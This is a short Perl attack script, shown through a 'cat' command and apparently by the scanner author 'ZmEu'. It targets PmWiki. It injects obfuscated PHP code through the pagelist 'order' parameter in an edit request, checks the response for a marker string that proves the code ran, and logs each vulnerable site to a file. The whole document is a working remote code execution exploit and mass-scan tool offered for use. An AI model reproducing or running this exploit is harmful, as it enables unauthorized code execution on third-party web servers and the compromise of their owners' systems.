$ cat test.pl
#!/usr/bin/perl -w
#
# *** Autor: ZmEu
# *** Multumiri: haxnet, foonet si blackhat(s).
# *** Testat pe: Mac(darwin 8.11.0).
#
# \"You may stop me, but you can\'t stop us all.\".
#

use LWP::UserAgent;

my $adresa=$ARGV[0] or die("(@)Se foloseste: perl pmwiki.pl http://example.com/pmwiki/pmwiki.php\n");
my
$incarca="chr%2890%29.chr%28109%29.chr%2869%29.chr%28117%29.chr%2832%29.chr%2848%29.chr%2846%29.chr%2849%29.chr%2832%29.chr%2845%29.chr%2832%29.chr%28112%29.chr%28109%29.chr%28119%29.chr%28105%29.chr%28107%29.chr%28105%29";

$ua=new LWP::UserAgent;
$ua->agent("ZmEu/1.0");

my $pmwikireq=new HTTP::Request POST => $adresa;
        $pmwikireq->content_type("application/x-www-form-urlencoded");
       
$pmwikireq->content("action=edit&n=Cmd.foo&text=%28%3Apagelist+order%3D%27%5D%29%3Berror_reporting%280%29%3Bprint%28$incarca%29%3Bdie%3B%23%3A%29&csum=&author=foo&preview=+Preview+");

my $pmwikires=$ua->request($pmwikireq);
my $zmeu=$pmwikires->as_string;

if($zmeu=~/ZmEu 0.1 - pmwiki/)
{
        print "(@)OK:$adresa\n";
        open(PMWIKIVULN, ">>vuln.txt");
        print PMWIKIVULN ("$adresa\n");
        close PMWIKIVULN;
}
else
{
       print "BAD:$adresa\n"; #este nevoie de parola.
}
$